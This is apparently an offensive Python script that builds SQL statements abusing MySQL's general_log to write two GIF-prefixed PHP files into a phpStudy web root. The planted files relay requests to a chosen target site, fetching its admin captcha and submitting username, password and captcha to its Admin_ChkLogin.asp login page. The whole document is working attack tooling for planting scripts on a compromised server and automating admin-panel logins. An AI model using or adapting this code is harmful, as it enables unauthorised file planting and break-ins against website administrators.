#!/usr/bin/env python3
"""gen_szsadwj.py - 生成szsadwj专用工具(81.70)
getcap_sz.php: 下载inc/checkcode.asp验证码
login_sz.php: 提交Admin_ChkLogin.asp
"""
getcap = '<?php $d=$_GET["d"];$ch=curl_init("http://".$d."/admin/inc/checkcode.asp?t=".time());curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_COOKIEJAR,"C:/phpStudy/WWW/szc.txt");curl_setopt($ch,CURLOPT_COOKIEFILE,"C:/phpStudy/WWW/szc.txt");curl_setopt($ch,CURLOPT_TIMEOUT,12);$r=curl_exec($ch);file_put_contents("C:/phpStudy/WWW/sz_cap.jpg",$r);echo "SAVED:".strlen($r);?>'

login = '<?php $d=$_GET["d"];$u=$_GET["u"];$p=$_GET["p"];$c=$_GET["c"];$jar="C:/phpStudy/WWW/szc.txt";$ch=curl_init("http://".$d."/admin/Admin_ChkLogin.asp");curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_POST,1);curl_setopt($ch,CURLOPT_POSTFIELDS,"UserName=".$u."&Password=".$p."&CheckCode=".$c);curl_setopt($ch,CURLOPT_COOKIEJAR,$jar);curl_setopt($ch,CURLOPT_COOKIEFILE,$jar);curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);curl_setopt($ch,CURLOPT_TIMEOUT,12);$r=curl_exec($ch);echo $r;?>'

for name, body in [('getcap_sz.php', getcap), ('login_sz.php', login)]:
    assert "'" not in body, name
    sql = []
    sql.append("SET GLOBAL general_log=OFF;")
    sql.append("SET GLOBAL general_log_file='C:/phpStudy/WWW/%s';" % name)
    sql.append("SET GLOBAL general_log=ON;")
    sql.append("SELECT 'GIF89a%s//'" % body)
    sql.append("SET GLOBAL general_log=OFF;")
    with open('/tmp/sz_%s.sql' % name.replace('.php', ''), 'w') as f:
        f.write('\n'.join(sql) + '\n')
    print(name, 'ready len', len(body))
